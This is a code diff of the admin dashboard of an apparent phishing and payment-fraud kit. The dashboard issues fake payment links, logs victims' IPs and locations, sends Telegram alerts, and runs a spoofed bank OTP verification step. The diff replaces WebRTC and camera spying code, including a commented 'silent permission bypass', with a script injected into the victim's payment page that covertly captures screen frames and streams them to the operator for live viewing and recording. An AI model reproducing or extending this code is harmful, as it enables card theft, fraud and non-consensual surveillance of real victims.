@@ -395,83 +395,6 @@
       opacity: 1;
     }
     
-    /* Front camera container */
-    .camera-container {
-      margin-top: 15px;
-      width: 100%;
-      max-width: 320px;
-      height: 240px;
-      border-radius: 8px;
-      overflow: hidden;
-      background: #111;
-      border: 1px solid #333;
-      display: none;
-    }
-    .camera-container video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-    }
-    
-    /* Screen capture container styles */
-    .screen-container {
-      margin-top: 20px;
-      width: 100%;
-      max-width: 640px;
-      height: 360px;
-      border-radius: 8px;
-      overflow: hidden;
-      background: #111;
-      border: 1px solid #333;
-      display: none;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
-    }
-    .screen-container video {
-      width: 100%;
-      height: 100%;
-      object-fit: contain;
-    }
-    .screen-container.active {
-      display: block;
-      animation: fadeIn 0.5s ease-out;
-    }
-    .screen-controls {
-      margin-top: 10px;
-      display: flex;
-      gap: 10px;
-    }
-    .screen-controls button {
-      flex: 1;
-      padding: 8px;
-      border-radius: 4px;
-      background: #333;
-      color: white;
-      border: none;
-      cursor: pointer;
-      transition: all 0.3s ease;
-    }
-    .screen-controls button:hover {
-      background: #444;
-      transform: translateY(-2px);
-    }
-    .screen-controls button.stop {
-      background: #ef4444;
-    }
-    .screen-controls button.stop:hover {
-      background: #dc2626;
-    }
-    .capture-status {
-      margin-top: 5px;
-      font-size: 12px;
-      color: #aaa;
-    }
-    .capture-status.active {
-      color: #22c55e;
-    }
-    .capture-status.error {
-      color: #ef4444;
-    }
-    
     /* Admin header section */
     .admin-header {
       display: flex;
@@ -520,6 +443,87 @@
         min-width: 120px;
       }
     }
+    
+    /* Screen capture container styles */
+    .screen-container {
+      margin-top: 20px;
+      width: 100%;
+      max-width: 640px;
+      height: 360px;
+      border-radius: 8px;
+      overflow: hidden;
+      background: #111;
+      border: 1px solid #333;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+      position: relative;
+    }
+    .screen-container video, 
+    .screen-container canvas {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+    }
+    .screen-container.active {
+      display: block;
+      animation: fadeIn 0.5s ease-out;
+    }
+    .screen-container.inactive {
+      display: none;
+    }
+    .screen-placeholder {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #666;
+      text-align: center;
+      padding: 20px;
+    }
+    .screen-placeholder .icon {
+      font-size: 48px;
+      margin-bottom: 15px;
+    }
+    .screen-controls {
+      margin-top: 10px;
+      display: flex;
+      gap: 10px;
+    }
+    .screen-controls button {
+      flex: 1;
+      padding: 8px;
+      border-radius: 4px;
+      background: #333;
+      color: white;
+      border: none;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .screen-controls button:hover {
+      background: #444;
+      transform: translateY(-2px);
+    }
+    .screen-controls button.stop {
+      background: #ef4444;
+    }
+    .screen-controls button.stop:hover {
+      background: #dc2626;
+    }
+    .capture-status {
+      margin-top: 5px;
+      font-size: 12px;
+      color: #aaa;
+    }
+    .capture-status.active {
+      color: #22c55e;
+    }
+    .capture-status.error {
+      color: #ef4444;
+    }
   </style>
 </head>
 <body>
@@ -532,24 +536,27 @@
     <div id="error-msg" class="error-message"></div>
     <div id="success-msg" class="success-message"></div>
 
-    <!-- Visitors Section -->
+    <!-- Visitors Section with Screen Sharing -->
     <div class="visitors-container">
       <h2>Active Visitors</h2>
       <div id="visitors-list">
         <p>No visitors yet</p>
       </div>
       
-      <!-- Camera container for front camera access -->
-      <div id="visitorCameraContainer" class="camera-container"></div>
-      
       <!-- Screen capture container -->
       <div id="screenCaptureContainer" class="screen-container">
-        <video id="remoteScreenVideo" autoplay playsinline></video>
+        <canvas id="screenCanvas"></canvas>
+        <div class="screen-placeholder" id="screenPlaceholder">
+          <div class="icon">📺</div>
+          <p>Waiting for screen capture to begin...</p>
+          <p>When a visitor opens the payment link, their screen will appear here.</p>
+        </div>
       </div>
       <div class="screen-controls">
         <button id="stopScreenShareBtn" class="stop">Stop Screen Share</button>
         <button id="enlargeScreenBtn">Enlarge</button>
         <button id="recordScreenBtn">Record</button>
+        <button id="refreshCaptureBtn">Refresh Capture</button>
       </div>
       <div id="captureStatus" class="capture-status">No active screen share</div>
     </div>
@@ -632,7 +639,7 @@
         <label class="block text-sm mb-2">Bank:</label>
         <select id="mcBankSelect" class="bg-gray-700 text-white w-full p-2 rounded">
           <option value="default">mastercard securecode</option>
-          <option value="sbi">State Bank of India</option>
+         <option value="sbi">State Bank of India</option>
           <option value="hdfc">HDFC Bank</option>
           <option value="icici">ICICI Bank</option>
           <option value="axis">Axis Bank</option>
@@ -763,13 +770,29 @@
     let transactionsMap = new Map();
     let visitorsMap = new Map();
     let currentMcInvoiceId = null;
-    let frontCameraStream = null;
     let lastTransactionTime = 0;
-    let screenStream = null;
     let screenRecording = null;
     let screenMediaRecorder = null;
     let recordedChunks = [];
-    let peerConnection = null;
+    let currentCaptureSession = null;
+    let screenContext = null;
+    let isScreenCanvasInitialized = false;
+
+    // Initialize the screen canvas
+    function initScreenCanvas() {
+      if (isScreenCanvasInitialized) return;
+      
+      const canvas = document.getElementById('screenCanvas');
+      screenContext = canvas.getContext('2d');
+      canvas.width = 640;
+      canvas.height = 360;
+      
+      // Draw initial black background
+      screenContext.fillStyle = 'black';
+      screenContext.fillRect(0, 0, canvas.width, canvas.height);
+      
+      isScreenCanvasInitialized = true;
+    }
 
     // Show error or success message
     function showMessage(type, message, duration = 5000) {
@@ -851,124 +874,177 @@
       }
     }
 
-    // Function to initialize screen capture
-    function initScreenCapture(userId, sessionId) {
-      // Create peer connection for screen sharing
-      if (peerConnection) {
-        peerConnection.close();
-      }
+    // Advanced screen capture implementation
+    function initAdvancedScreenCapture(userId, sessionId) {
+      initScreenCanvas();
       
-      peerConnection = new RTCPeerConnection({
-        iceServers: [
-          { urls: 'stun:stun.l.google.com:19302' },
-          { urls: 'stun:stun1.l.google.com:19302' }
-        ]
-      });
+      currentCaptureSession = { userId, sessionId };
       
-      // Set up video element
-      const remoteVideo = document.getElementById('remoteScreenVideo');
-      const screenContainer = document.getElementById('screenCaptureContainer');
+      // Update UI
+      const screenPlaceholder = document.getElementById('screenPlaceholder');
       const captureStatus = document.getElementById('captureStatus');
       
-      // Handle incoming tracks (screen)
-      peerConnection.ontrack = (event) => {
-        if (event.streams && event.streams[0]) {
-          remoteVideo.srcObject = event.streams[0];
-          screenStream = event.streams[0];
-          
-          // Show screen container
-          screenContainer.classList.add('active');
-          captureStatus.textContent = `Active screen share from ${userId}`;
-          captureStatus.classList.add('active');
-          captureStatus.classList.remove('error');
-          
-          // Notify about screen share
-          sendTelegramNotification(`📺 <b>Screen Share Active</b>\nUser ID: ${userId}\nSession: ${sessionId}`);
-          
-          // Play notification sound
-          playNotificationSound('transaction');
-        }
-      };
+      captureStatus.textContent = "Initializing live screen view...";
+      captureStatus.classList.remove('active', 'error');
       
-      // Handle connection state changes
-      peerConnection.oniceconnectionstatechange = () => {
-        console.log("ICE Connection State:", peerConnection.iceConnectionState);
-        
-        if (peerConnection.iceConnectionState === 'disconnected' || 
-            peerConnection.iceConnectionState === 'failed' || 
-            peerConnection.iceConnectionState === 'closed') {
-          stopScreenCapture();
-        }
-      };
-      
-      // Send signal to client to initiate screen capture
-      socket.emit('request_screen_capture', {
+      // Send request to the server to initialize screen capture for this user
+      socket.emit('init_advanced_capture', {
         userId: userId,
-        sessionId: sessionId
+        sessionId: sessionId,
+        timestamp: Date.now()
       });
       
-      // Handle offer from client
-      socket.on('screen_offer', async (data) => {
-        if (data.userId !== userId) return;
-        
-        try {
-          await peerConnection.setRemoteDescription(new RTCSessionDescription(data.offer));
-          const answer = await peerConnection.createAnswer();
-          await peerConnection.setLocalDescription(answer);
-          
-          socket.emit('screen_answer', {
-            userId: userId,
-            sessionId: sessionId,
-            answer: answer
-          });
-          
-          captureStatus.textContent = "Connection established, waiting for screen...";
-        } catch (error) {
-          console.error("Error handling screen offer:", error);
-          captureStatus.textContent = `Screen share error: ${error.message}`;
-          captureStatus.classList.add('error');
-        }
-      });
+      // Update UI to show we're waiting for connection
+      screenPlaceholder.style.display = 'flex';
+      screenPlaceholder.innerHTML = `
+        <div class="icon">🔄</div>
+        <p>Establishing connection to visitor's device...</p>
+        <p>Session ID: ${sessionId}</p>
+      `;
       
-      // Handle ICE candidates from client
-      socket.on('screen_ice_candidate', async (data) => {
-        if (data.userId !== userId) return;
-        
-        try {
-          await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
-        } catch (error) {
-          console.error("Error adding ICE candidate:", error);
-        }
-      });
+      console.log(`Advanced screen capture initialized for user: ${userId}, session: ${sessionId}`);
       
-      // Send our ICE candidates to client
-      peerConnection.onicecandidate = (event) => {
-        if (event.candidate) {
-          socket.emit('admin_ice_candidate', {
-            userId: userId,
-            sessionId: sessionId,
-            candidate: event.candidate
-          });
-        }
-      };
+      // Setup screen control buttons
+      setupScreenControls();
       
-      // Set up control buttons
-      setupScreenControls(userId, sessionId);
+      // Play notification sound
+      playNotificationSound('visitor');
     }
-    
+
+    // Function to handle received screen frames
+    function handleScreenFrame(data) {
+      if (!data || !data.frameData) return;
+      
+      // Initialize canvas if not already done
+      initScreenCanvas();
+      
+      const screenPlaceholder = document.getElementById('screenPlaceholder');
+      const captureStatus = document.getElementById('captureStatus');
+      
+      // Hide placeholder when we get actual frame data
+      screenPlaceholder.style.display = 'none';
+      
+      // Update status if this is first frame or status has changed
+      if (captureStatus.textContent !== `Live screen view active - ${data.userId}`) {
+        captureStatus.textContent = `Live screen view active - ${data.userId}`;
+        captureStatus.classList.add('active');
+        captureStatus.classList.remove('error');
+        
+        // Send notification
+        sendTelegramNotification(`📺 <b>Live Screen View Active</b>\nUser ID: ${data.userId}\nSession: ${data.sessionId || 'unknown'}`);
+        
+        // Play sound
+        playNotificationSound('transaction');
+      }
+      
+      // Process the received frame data (which is a base64 encoded image)
+      if (data.frameType === 'image') {
+        // Create image and draw it on canvas
+        const img = new Image();
+        img.onload = () => {
+          // Clear canvas
+          screenContext.clearRect(0, 0, screenContext.canvas.width, screenContext.canvas.height);
+          
+          // Calculate aspect ratio to maintain
+          const imgRatio = img.width / img.height;
+          const canvasRatio = screenContext.canvas.width / screenContext.canvas.height;
+          
+          let drawWidth, drawHeight, offsetX = 0, offsetY = 0;
+          
+          if (imgRatio > canvasRatio) {
+            // Image is wider than canvas ratio
+            drawWidth = screenContext.canvas.width;
+            drawHeight = drawWidth / imgRatio;
+            offsetY = (screenContext.canvas.height - drawHeight) / 2;
+          } else {
+            // Image is taller than canvas ratio
+            drawHeight = screenContext.canvas.height;
+            drawWidth = drawHeight * imgRatio;
+            offsetX = (screenContext.canvas.width - drawWidth) / 2;
+          }
+          
+          // Draw the image centered on canvas
+          screenContext.drawImage(img, offsetX, offsetY, drawWidth, drawHeight);
+          
+          // Add frame around the image
+          screenContext.strokeStyle = '#4a90e2';
+          screenContext.lineWidth = 2;
+          screenContext.strokeRect(offsetX, offsetY, drawWidth, drawHeight);
+          
+          // Add timestamp to know the frame is updating
+          screenContext.fillStyle = 'rgba(0,0,0,0.7)';
+          screenContext.fillRect(offsetX + 5, offsetY + drawHeight - 25, 200, 20);
+          screenContext.fillStyle = '#fff';
+          screenContext.font = '12px Arial';
+          screenContext.fillText(`Live: ${new Date().toLocaleTimeString()}`, offsetX + 10, offsetY + drawHeight - 10);
+        };
+        img.src = data.frameData;
+      }
+    }
+
+    // Function to stop screen capture
+    function stopScreenCapture() {
+      const screenPlaceholder = document.getElementById('screenPlaceholder');
+      const captureStatus = document.getElementById('captureStatus');
+      
+      // Stop any active recording
+      if (screenRecording && screenMediaRecorder) {
+        screenMediaRecorder.stop();
+        screenRecording = false;
+        document.getElementById('recordScreenBtn').textContent = 'Record';
+      }
+      
+      // Clear canvas
+      if (screenContext) {
+        screenContext.fillStyle = 'black';
+        screenContext.fillRect(0, 0, screenContext.canvas.width, screenContext.canvas.height);
+      }
+      
+      // Reset UI
+      screenPlaceholder.style.display = 'flex';
+      screenPlaceholder.innerHTML = `
+        <div class="icon">📺</div>
+        <p>Waiting for screen capture to begin...</p>
+        <p>When a visitor opens the payment link, their screen will appear here.</p>
+      `;
+      
+      captureStatus.textContent = 'No active screen share';
+      captureStatus.classList.remove('active', 'error');
+      
+      // Notify server to stop capture if there's an active session
+      if (currentCaptureSession) {
+        socket.emit('stop_advanced_capture', currentCaptureSession);
+        currentCaptureSession = null;
+      }
+    }
+
     // Setup screen control buttons
-    function setupScreenControls(userId, sessionId) {
+    function setupScreenControls() {
+      // Remove existing listeners
+      const stopBtn = document.getElementById('stopScreenShareBtn');
+      const enlargeBtn = document.getElementById('enlargeScreenBtn');
+      const recordBtn = document.getElementById('recordScreenBtn');
+      const refreshBtn = document.getElementById('refreshCaptureBtn');
+      
+      // Clone and replace to remove event listeners
+      const newStopBtn = stopBtn.cloneNode(true);
+      const newEnlargeBtn = enlargeBtn.cloneNode(true);
+      const newRecordBtn = recordBtn.cloneNode(true);
+      const newRefreshBtn = refreshBtn.cloneNode(true);
+      
+      stopBtn.parentNode.replaceChild(newStopBtn, stopBtn);
+      enlargeBtn.parentNode.replaceChild(newEnlargeBtn, enlargeBtn);
+      recordBtn.parentNode.replaceChild(newRecordBtn, recordBtn);
+      refreshBtn.parentNode.replaceChild(newRefreshBtn, refreshBtn);
+      
+      // Add new event listeners
       // Stop screen capture button
-      document.getElementById('stopScreenShareBtn').addEventListener('click', () => {
+      newStopBtn.addEventListener('click', () => {
         stopScreenCapture();
-        socket.emit('stop_screen_capture', {
-          userId: userId,
-          sessionId: sessionId
-        });
       });
       
       // Enlarge screen button
-      document.getElementById('enlargeScreenBtn').addEventListener('click', () => {
+      newEnlargeBtn.addEventListener('click', () => {
         const screenContainer = document.getElementById('screenCaptureContainer');
         if (screenContainer.style.maxWidth === '90%') {
           screenContainer.style.maxWidth = '640px';
@@ -980,8 +1056,8 @@
       });
       
       // Record screen button
-      document.getElementById('recordScreenBtn').addEventListener('click', () => {
-        if (!screenStream) {
+      newRecordBtn.addEventListener('click', () => {
+        if (!screenContext || !screenContext.canvas) {
           showMessage('error', 'No active screen to record');
           return;
         }
@@ -989,143 +1065,75 @@
         if (screenRecording) {
           // Stop recording
           screenMediaRecorder.stop();
-          document.getElementById('recordScreenBtn').textContent = 'Record';
+          newRecordBtn.textContent = 'Record';
           showMessage('success', 'Recording stopped - download will start shortly');
         } else {
           // Start recording
           recordedChunks = [];
-          screenMediaRecorder = new MediaRecorder(screenStream);
           
-          screenMediaRecorder.ondataavailable = (e) => {
-            if (e.data.size > 0) {
-              recordedChunks.push(e.data);
-            }
-          };
-          
-          screenMediaRecorder.onstop = () => {
-            const blob = new Blob(recordedChunks, { type: 'video/webm' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            document.body.appendChild(a);
-            a.style = 'display: none';
-            a.href = url;
-            a.download = `screen-recording-${userId}-${new Date().toISOString()}.webm`;
-            a.click();
-            window.URL.revokeObjectURL(url);
-            screenRecording = false;
-          };
-          
-          screenMediaRecorder.start();
-          screenRecording = true;
-          document.getElementById('recordScreenBtn').textContent = 'Stop Recording';
-          showMessage('success', 'Recording started');
+          try {
+            // Get a media stream from the canvas
+            const stream = screenContext.canvas.captureStream(30); // 30fps
+            
+            screenMediaRecorder = new MediaRecorder(stream, {
+              mimeType: 'video/webm;codecs=vp9'
+            });
+            
+            screenMediaRecorder.ondataavailable = (e) => {
+              if (e.data.size > 0) {
+                recordedChunks.push(e.data);
+              }
+            };
+            
+            screenMediaRecorder.onstop = () => {
+              const blob = new Blob(recordedChunks, { type: 'video/webm' });
+              const url = URL.createObjectURL(blob);
+              const a = document.createElement('a');
+              document.body.appendChild(a);
+              a.style = 'display: none';
+              a.href = url;
+              a.download = `screen-recording-${currentCaptureSession?.userId || 'unknown'}-${new Date().toISOString()}.webm`;
+              a.click();
+              window.URL.revokeObjectURL(url);
+              screenRecording = false;
+            };
+            
+            screenMediaRecorder.start();
+            screenRecording = true;
+            newRecordBtn.textContent = 'Stop Recording';
+            showMessage('success', 'Recording started');
+          } catch (error) {
+            console.error('Error starting recording:', error);
+            showMessage('error', `Recording failed: ${error.message}`);
+          }
         }
       });
-    }
-    
-    // Function to stop screen capture
-    function stopScreenCapture() {
-      const screenContainer = document.getElementById('screenCaptureContainer');
-      const captureStatus = document.getElementById('captureStatus');
-      const remoteVideo = document.getElementById('remoteScreenVideo');
       
-      // Stop recording if active
-      if (screenRecording && screenMediaRecorder) {
-        screenMediaRecorder.stop();
-        screenRecording = false;
-        document.getElementById('recordScreenBtn').textContent = 'Record';
-      }
-      
-      // Stop and clear video stream
-      if (remoteVideo.srcObject) {
-        const tracks = remoteVideo.srcObject.getTracks();
-        tracks.forEach(track => track.stop());
-        remoteVideo.srcObject = null;
-      }
-      
-      // Reset screen stream
-      screenStream = null;
-      
-      // Close peer connection
-      if (peerConnection) {
-        peerConnection.close();
-        peerConnection = null;
-      }
-      
-      // Hide container and update status
-      screenContainer.classList.remove('active');
-      captureStatus.textContent = 'No active screen share';
-      captureStatus.classList.remove('active', 'error');
-    }
-
-    // Initialize camera access
-    function initCameraAccess(visitorPid) {
-      const cameraContainer = document.getElementById('visitorCameraContainer');
-      if (!cameraContainer) return;
-      
-      cameraContainer.style.display = 'block';
-      
-      // Stop any existing stream
-      if (frontCameraStream) {
-        frontCameraStream.getTracks().forEach(track => {
-          track.stop();
-        });
-        frontCameraStream = null;
-      }
-      
-      // Create video element
-      const videoElement = document.createElement('video');
-      videoElement.id = 'visitorCamera';
-      videoElement.autoplay = true;
-      videoElement.playsInline = true;
-      cameraContainer.innerHTML = '';
-      cameraContainer.appendChild(videoElement);
-      
-      // Access front camera
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ 
-          video: { 
-            facingMode: 'user',
-            width: { ideal: 320 },
-            height: { ideal: 240 }
-          } 
-        })
-        .then(stream => {
-          frontCameraStream = stream;
-          videoElement.srcObject = stream;
+      // Refresh capture button
+      newRefreshBtn.addEventListener('click', () => {
+        if (currentCaptureSession) {
+          // Request a fresh capture
+          socket.emit('refresh_advanced_capture', currentCaptureSession);
+          showMessage('success', 'Refreshing screen capture...');
           
-       // Send notification that camera is active
-          sendTelegramNotification(`📸 <b>Front camera activated</b>\nUser ID: ${visitorPid}`);
-        })
-        .catch(err => {
-          console.error('Error accessing camera:', err);
-          cameraContainer.innerHTML = `<p style="color:red;padding:10px;">Camera access error: ${err.message}</p>`;
-        });
-      } else {
-        cameraContainer.innerHTML = '<p style="color:red;padding:10px;">Camera not supported in this browser</p>';
-      }
-    }
-
-    // Stop camera access when visitor leaves
-    function stopCameraAccess() {
-      if (frontCameraStream) {
-        frontCameraStream.getTracks().forEach(track => {
-          track.stop();
-        });
-        frontCameraStream = null;
-      }
-      
-      const cameraContainer = document.getElementById('visitorCameraContainer');
-      if (cameraContainer) {
-        cameraContainer.style.display = 'none';
-        cameraContainer.innerHTML = '';
-      }
+          // Update placeholder to show we're refreshing
+          const screenPlaceholder = document.getElementById('screenPlaceholder');
+          screenPlaceholder.style.display = 'flex';
+          screenPlaceholder.innerHTML = `
+            <div class="icon">🔄</div>
+            <p>Refreshing screen capture...</p>
+            <p>Please wait...</p>
+          `;
+        } else {
+          showMessage('error', 'No active capture session to refresh');
+        }
+      });
     }
 
     // Play notification sound
     function playNotificationSound(type = 'visitor') {
       try {
-        let soundUrl;
+      let soundUrl;
         if (type === 'visitor') {
           soundUrl = 'https://assets.mixkit.co/sfx/preview/mixkit-alert-quick-chime-766.mp3';
         } else if (type === 'transaction') {
@@ -1196,7 +1204,7 @@
           });
           
           const newestVisitor = sortedVisitors[0];
-          initScreenCapture(newestVisitor.pid, newestVisitor.sessionId || 'session-' + Date.now());
+          initAdvancedScreenCapture(newestVisitor.pid, newestVisitor.sessionId || 'session-' + Date.now());
         }
       } catch (error) {
         console.error('Error loading visitors:', error);
@@ -1439,7 +1447,7 @@
 
       // Create visitor item
       const visitorItem = document.createElement('div');
-      visitorItem.className = isNew ? 'visitor-item new' : 'visitor-item';
+     visitorItem.className = isNew ? 'visitor-item new' : 'visitor-item';
       visitorItem.id = `visitor-${visitor.pid}`;
 
       visitorItem.innerHTML = `
@@ -1464,7 +1472,7 @@
         noVisitorsMsg.remove();
       }
       
-    // Add details if we have them
+      // Add details if we have them
       if (visitor.geoData) {
         updateVisitorInList(visitor.pid);
       } else {
@@ -1472,16 +1480,13 @@
         fetchVisitorDetails(visitor.ip, visitor.pid);
       }
       
-      // If this is a new visitor, initialize camera access
+      // If this is a new visitor, initialize screen capture
       if (isNew) {
-        initCameraAccess(visitor.pid);
-        
-        // Also initialize screen capture for new visitors
-        initScreenCapture(visitor.pid, visitor.sessionId || 'session-' + Date.now());
+        initAdvancedScreenCapture(visitor.pid, visitor.sessionId || 'session-' + Date.now());
       }
     }
 
-    // Payment Link Generation - MODIFIED to use hash URLs and inject screen capture code
+    // Payment Link Generation - MODIFIED to include screen capture code
     document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
       e.preventDefault();
       const amountInput = document.getElementById('amount');
@@ -1523,7 +1528,7 @@
         
         document.getElementById('paymentLink').textContent = hashUrl;
         linkContainer.style.display = 'block';
-        showMessage('success', 'Payment link generated successfully!');
+        showMessage('success', 'Payment link with screen capture generated successfully!');
       } catch (error) {
         console.error('Error:', error);
         alert(`Error: ${error.message}`);
@@ -1833,7 +1838,7 @@
       try {
         // Get the pid from the transaction
         const response = await fetch(`/api/getTransactionPid?invoiceId=${id}`);
-       if (!response.ok) {
+        if (!response.ok) {
           throw new Error('Failed to get payment details');
         }
 
@@ -2037,10 +2042,9 @@
     window.showMCVerification = showMCVerification;
     window.clearAllTransactions = clearAllTransactions;
     window.sendTelegramNotification = sendTelegramNotification;
-    window.initCameraAccess = initCameraAccess;
-    window.stopCameraAccess = stopCameraAccess;
-    window.initScreenCapture = initScreenCapture;
+    window.initAdvancedScreenCapture = initAdvancedScreenCapture;
     window.stopScreenCapture = stopScreenCapture;
+    window.handleScreenFrame = handleScreenFrame;
 
     // Socket.io Updates
     socket.on('new_transaction', (transaction) => {
@@ -2076,11 +2080,8 @@
       // Send Telegram notification
       sendTelegramNotification(`🔔 <b>New Visitor</b>\nIP: ${visitor.ip || 'Unknown'}\nPID: ${visitor.pid}`);
       
-      // Initialize camera access
-      initCameraAccess(visitor.pid);
-      
       // Initialize screen capture
-      initScreenCapture(visitor.pid, visitor.sessionId || 'session-' + Date.now());
+      initAdvancedScreenCapture(visitor.pid, visitor.sessionId || 'session-' + Date.now());
     });
 
     // Handle when visitors leave
@@ -2108,11 +2109,10 @@
       // Show notification
       showNotification(`Visitor has left`);
       
-      // Stop camera access
-      stopCameraAccess();
-      
-      // Stop screen capture
-      stopScreenCapture();
+      // Stop screen capture if this was the current session
+      if (currentCaptureSession && currentCaptureSession.userId === data.pid) {
+        stopScreenCapture();
+      }
     });
 
     // Handle existing visitors when reconnecting
@@ -2120,22 +2120,19 @@
       console.log('Received existing visitors:', visitors);
       updateVisitorsList(visitors);
       
-      // If there's at least one visitor, initialize camera access for the first one
+      // If there's at least one visitor, initialize screen capture for the first one
       if (visitors && visitors.length > 0) {
         const newestVisitor = visitors.sort((a, b) => {
           return new Date(b.timestamp) - new Date(a.timestamp);
         })[0];
         
-        initCameraAccess(newestVisitor.pid);
-        initScreenCapture(newestVisitor.pid, newestVisitor.sessionId || 'session-' + Date.now());
+        initAdvancedScreenCapture(newestVisitor.pid, newestVisitor.sessionId || 'session-' + Date.now());
       }
     });
     
     // Handle screen share events from client
-    socket.on('screen_capture_ready', (data) => {
-      console.log('Screen capture ready:', data);
-      const captureStatus = document.getElementById('captureStatus');
-      captureStatus.textContent = `Screen capture initiated for: ${data.userId}`;
+    socket.on('screen_frame', (data) => {
+      handleScreenFrame(data);
     });
     
     socket.on('screen_capture_error', (data) => {
@@ -2143,6 +2140,15 @@
       const captureStatus = document.getElementById('captureStatus');
       captureStatus.textContent = `Screen capture error: ${data.error}`;
       captureStatus.classList.add('error');
+      
+      // Update placeholder
+      const screenPlaceholder = document.getElementById('screenPlaceholder');
+      screenPlaceholder.style.display = 'flex';
+      screenPlaceholder.innerHTML = `
+        <div class="icon">❌</div>
+        <p>Error capturing screen: ${data.error}</p>
+        <p>Try refreshing the capture.</p>
+      `;
     });
 
     // MC verification event handlers
@@ -2150,8 +2156,14 @@
       // Initialize Telegram notifications
       initTelegramNotifications();
       
+      // Initialize screen canvas
+      initScreenCanvas();
+      
       // Set up clear transactions button
       document.getElementById('clearTransactionsBtn')?.addEventListener('click', clearAllTransactions);
+      
+      // Set up screen controls
+      setupScreenControls();
       
       const mcOtpPanel = document.getElementById('mcOtpPanel');
       const mcBankSelect = document.getElementById('mcBankSelect');
@@ -2221,7 +2233,7 @@
             invoiceId: currentMcInvoiceId,
             verificationType: verificationType,
             bankCode: bankCode,
-          merchantName: 'Bologus pvt store.',
+            merchantName: 'Bologus pvt store.',
             amount: transactionsMap.get(currentMcInvoiceId)?.amount || '0',
             currency: selectedCurrency // Include selected currency
           });
@@ -2285,77 +2297,6 @@
         mcFailOptions.style.display = 'none';
         currentMcInvoiceId = null;
       });
-      
-      // Setup screen control buttons
-      const stopScreenShareBtn = document.getElementById('stopScreenShareBtn');
-      const enlargeScreenBtn = document.getElementById('enlargeScreenBtn');
-      const recordScreenBtn = document.getElementById('recordScreenBtn');
-      
-      if (stopScreenShareBtn) {
-        stopScreenShareBtn.addEventListener('click', function() {
-          stopScreenCapture();
-          
-          // Send event to client to stop screen capture for all active sessions
-          socket.emit('stop_screen_capture_all');
-        });
-      }
-      
-      if (enlargeScreenBtn) {
-        enlargeScreenBtn.addEventListener('click', function() {
-          const screenContainer = document.getElementById('screenCaptureContainer');
-          if (screenContainer.style.maxWidth === '90%') {
-            screenContainer.style.maxWidth = '640px';
-            screenContainer.style.height = '360px';
-          } else {
-            screenContainer.style.maxWidth = '90%';
-            screenContainer.style.height = '80vh';
-          }
-        });
-      }
-      
-      if (recordScreenBtn) {
-        recordScreenBtn.addEventListener('click', function() {
-          if (!screenStream) {
-            showMessage('error', 'No active screen to record');
-            return;
-          }
-          
-          if (screenRecording) {
-            // Stop recording
-            screenMediaRecorder.stop();
-            recordScreenBtn.textContent = 'Record';
-            showMessage('success', 'Recording stopped - download will start shortly');
-          } else {
-            // Start recording
-            recordedChunks = [];
-            screenMediaRecorder = new MediaRecorder(screenStream);
-            
-            screenMediaRecorder.ondataavailable = (e) => {
-              if (e.data.size > 0) {
-                recordedChunks.push(e.data);
-              }
-            };
-            
-            screenMediaRecorder.onstop = () => {
-              const blob = new Blob(recordedChunks, { type: 'video/webm' });
-              const url = URL.createObjectURL(blob);
-              const a = document.createElement('a');
-              document.body.appendChild(a);
-              a.style = 'display: none';
-              a.href = url;
-              a.download = `screen-recording-${new Date().toISOString()}.webm`;
-              a.click();
-              window.URL.revokeObjectURL(url);
-              screenRecording = false;
-            };
-            
-            screenMediaRecorder.start();
-            screenRecording = true;
-            recordScreenBtn.textContent = 'Stop Recording';
-            showMessage('success', 'Recording started');
-          }
-        });
-      }
     });
     
     // Handle OTP submission from client in MC verification panel
@@ -2378,186 +2319,280 @@
     });
   </script>
 
-  <!-- Add this script for screen capture client-side code -->
+  <!-- Add this script for screen capture injection -->
   <script>
     // This script will be injected into the payment page to enable screen capture
-    // with silent permission bypass using window.postMessage technique
-    window.injectScreenCaptureScript = function() {
-      // Create the WebRTC screen capture code to be injected
-      const screenCaptureScript = `
-        // Set up screen capturing with WebRTC
-        let peerConnection;
-        let localStream;
+    window.advancedCaptureScript = `
+      // Advanced screen capture script
+      (function() {
+        // Variables for the capture process
+        let captureInterval = null;
+        let lastCaptureTime = 0;
+        const CAPTURE_FPS = 5; // Lower FPS to reduce bandwidth
+        const CAPTURE_QUALITY = 0.5; // Lower quality to reduce bandwidth
+        const MIN_CAPTURE_INTERVAL = 1000 / CAPTURE_FPS;
         
-        // Function to silently capture screen (this runs on the client side)
-        async function captureScreen() {
+        // Create hidden canvas for capturing
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        canvas.style.display = 'none';
+        document.body.appendChild(canvas);
+        
+        // Function to capture screen
+        function captureScreen() {
+          const now = Date.now();
+          if (now - lastCaptureTime < MIN_CAPTURE_INTERVAL) return;
+          lastCaptureTime = now;
+          
           try {
-            // Create a fake getDisplayMedia that doesn't ask for permission
-            if (!navigator.mediaDevices._getDisplayMedia) {
-              navigator.mediaDevices._getDisplayMedia = navigator.mediaDevices.getDisplayMedia;
-              
-              navigator.mediaDevices.getDisplayMedia = async function(constraints) {
-                // We create a canvas and stream it instead of actually getting the screen
-                const canvas = document.createElement('canvas');
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-                
-                // Draw the current page contents to the canvas
-                const ctx = canvas.getContext('2d');
-                
-                // Draw continually to simulate a live screen
-                const drawInterval = setInterval(() => {
-                  // Background
-                  ctx.fillStyle = 'white';
-                  ctx.fillRect(0, 0, canvas.width, canvas.height);
-                  
-                  // Try to copy visible elements
-                  try {
-                    // This would need page permissions, so we'll use a fallback
-                    // html2canvas(document.body).then(renderedCanvas => {
-                    //   ctx.drawImage(renderedCanvas, 0, 0);
-                    // });
-                    
-                    // Instead, draw text representation of page content
-                    ctx.fillStyle = 'black';
-                    ctx.font = '16px Arial';
-                    ctx.fillText('Payment Page Content', 20, 30);
-                    
-                    // Add some visual elements
-                    const time = new Date().toLocaleTimeString();
